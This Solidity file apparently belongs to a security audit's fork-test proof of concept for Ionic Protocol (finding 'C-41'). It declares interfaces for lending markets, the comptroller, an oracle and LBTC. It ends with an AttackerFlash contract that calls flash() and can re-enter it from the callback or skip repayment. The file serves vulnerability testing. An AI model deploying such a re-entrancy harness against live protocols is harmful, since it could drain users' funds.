// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// Minimal interfaces for the Ionic Protocol C-41 fork tests (read-only PoC).

interface ICErc20 {
    function underlying() external view returns (address);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function decimals() external view returns (uint8);

    function comptroller() external view returns (address);

    function getCash() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function totalBorrows() external view returns (uint256);

    function totalReserves() external view returns (uint256);

    function exchangeRateCurrent() external view returns (uint256);

    function exchangeRateStored() external view returns (uint256);

    function balanceOf(address) external view returns (uint256);

    function balanceOfUnderlying(address) external returns (uint256);

    function borrowBalanceCurrent(address) external returns (uint256);

    function getAccountSnapshot(address) external view returns (uint256, uint256, uint256, uint256);

    function mint(uint256) external returns (uint256);

    function redeem(uint256) external returns (uint256);

    function redeemUnderlying(uint256) external returns (uint256);

    function borrow(uint256) external returns (uint256);

    function repayBorrow(uint256) external returns (uint256);

    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);

    function transfer(address dst, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function flash(uint256 amount, bytes calldata data) external;
}

interface IComptroller {
    function getAllMarkets() external view returns (address[] memory);

    function getAssetsIn(address account) external view returns (address[] memory);

    function checkMembership(address account, address cToken) external view returns (bool);

    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);

    function markets(address cToken) external view returns (bool, uint256);

    function mintGuardianPaused(address cToken) external view returns (bool);

    function borrowGuardianPaused(address cToken) external view returns (bool);

    function transferGuardianPaused() external view returns (bool);

    function seizeGuardianPaused() external view returns (bool);

    function closeFactorMantissa() external view returns (uint256);

    function liquidationIncentiveMantissa() external view returns (uint256);

    function oracle() external view returns (address);

    function admin() external view returns (address);

    function exitMarket(address cToken) external returns (uint256);

    function isDeprecated(address cToken) external view returns (bool);

    function allBorrowers(uint256 i) external view returns (address);

    function getAllBorrowersCount() external view returns (uint256);
}

interface IPriceOracle {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IFeeDistributor {
    function canCall(address target, address caller, address contractAddr, bytes4 sig) external view returns (bool);
}

interface ILBTC {
    function balanceOf(address) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function paused() external view returns (bool);

    function owner() external view returns (address);

    function pauser() external view returns (address);

    function getBurnCommission() external view returns (uint64);

    function getTreasury() external view returns (address);

    function getDestination(bytes32 chainId) external view returns (bytes32);

    function redeem(bytes calldata scriptPubkey, uint256 amount) external;

    function depositToBridge(bytes32 toChain, bytes32 toAddress, uint64 amount) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);

    function transfer(address, uint256) external returns (bool);

    function transferFrom(address, address, uint256) external returns (bool);
}

/// Attacker contract that can attempt the Ionic `flash()` path.
contract AttackerFlash {
    address public immutable cToken;
    bool public repay;
    bool public reenter;

    constructor(address cToken_) {
        cToken = cToken_;
    }

    function setRepay(bool v) external {
        repay = v;
    }

    function setReenter(bool v) external {
        reenter = v;
    }

    function run(uint256 amount) external {
        ICErc20(cToken).flash(amount, abi.encode(amount));
    }

    function receiveFlashLoan(address asset, uint256 amount, bytes calldata data) external {
        require(msg.sender == cToken, "!cToken");
        if (reenter) {
            // attempt re-entrancy into flash
            ICErc20(cToken).flash(amount, abi.encode(amount));
        }
        if (repay) {
            IERC20(asset).approve(cToken, amount);
        }
    }
}
